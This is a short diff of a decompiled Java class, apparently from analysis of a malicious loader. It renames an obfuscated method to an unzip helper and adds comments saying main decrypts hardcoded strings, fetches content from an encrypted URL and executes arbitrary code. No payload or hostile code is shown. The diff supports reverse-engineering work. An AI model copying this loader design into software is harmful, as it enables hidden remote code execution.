@@ -72,15 +72,15 @@ public class Run {
         } catch (IOException iOException) {
             // empty catch block
         }
-        Run.d(path2, path);
+        Run.unpackZipFileToDirectory(path2, path);
     }
 
     /**
-     *
-     * @param path path to file
-     * @param path2
+     * Unpacks zip file to directory
+     * @param path path to zip file
+     * @param path2 where to unpack zip file
      */
-    private static void d(Path path, Path path2) {
+    private static void unpackZipFileToDirectory(Path path, Path path2) {
         try {
             if (!path.toFile().exists()) {
                 return;
@@ -112,7 +112,11 @@ public class Run {
 
     /**
      * main method is driver code
-     * @param arrstring is not used anywhere
+     * saves system property described by an encrypted string to another string
+     * saves another encrypted stiring's plaintext to a string
+     * writes to the system property from url given by an encrypted string
+     * executes arbitrary code given by an encrypted string
+     * @param arrstring is not used anywhere, all values are hardcoded in the program
      * @throws Exception IOException
      */
     public static void main(String[] arrstring) throws Exception {
